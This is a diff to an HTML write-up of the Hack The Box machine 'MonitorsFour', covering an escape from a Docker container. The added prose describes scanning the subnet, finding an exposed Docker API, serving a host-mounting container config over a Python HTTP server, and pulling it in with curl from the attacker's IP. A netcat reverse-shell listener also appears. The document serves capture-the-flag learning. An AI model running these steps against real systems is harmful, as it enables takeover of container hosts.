@@ -405,11 +405,15 @@ nc -lvnp 9001
 <p>
 The shell was inside a Docker container, requiring container escape
 to access the host filesystem.
+we weren’t able to get a connection but based on the error, at least we were able to get an IP address: <code>192.168.65.254</code>
+
+<code>>host.docker.internal</code> points to <code>192.168.65.254</code> but we couldn’t get get a connection so we can check other IP addresses in the subnet using the following script:
 </p>
 
 <figure>
 <img src="../../../assets/writeups/htb/MonitorsFour/image9.png">
 </figure>
+   
 
 <pre><code class="language-bash">
 for i in $(seq 1 254); do
@@ -423,12 +427,19 @@ done
 wait
 </code></pre>
 
+<p>
+   we get a hit. The Docker API is open on 192.168.65.7.
+</p>
+
 <h4>Enumerate Docker Images</h4>
 
 <pre><code class="language-bash">
 curl -s http://192.168.65.7:2375/images/json
 </code></pre>
 
+<p>
+   we go back to our host machine and create a container configuration with host filesystem mounted using the following code, we can create it in the file /tmp/container.json .
+</p>
 <pre><code class="language-json">
 {
   "Image": "alpine:latest",
@@ -439,11 +450,26 @@ curl -s http://192.168.65.7:2375/images/json
   ]
 }
 </code></pre>
-
+<p>Next we start a http server using python:</p>
+<pre><code class="language-bash">
+cd /tmp
+python -m http.server 8000
+</code></pre>
+<p>
+   Then we return to the container and we download the payload:
+</p>
+<pre>
+   <code class="language-json">
+      curl http://<our-IP>:8000/container.json -o /tmp/container.json
+   </code>
+</pre>
+<p>
+   We then create the container, and start it:
+</p>
 <figure>
 <img src="../../../assets/writeups/htb/MonitorsFour/image10.png">
 </figure>
-
+<p>I cut out the flag, but it’s supposed to be printed after the last line in the image above.</p>
 <figure>
 <img src="../../../assets/writeups/htb/MonitorsFour/image11.png">
 </figure>
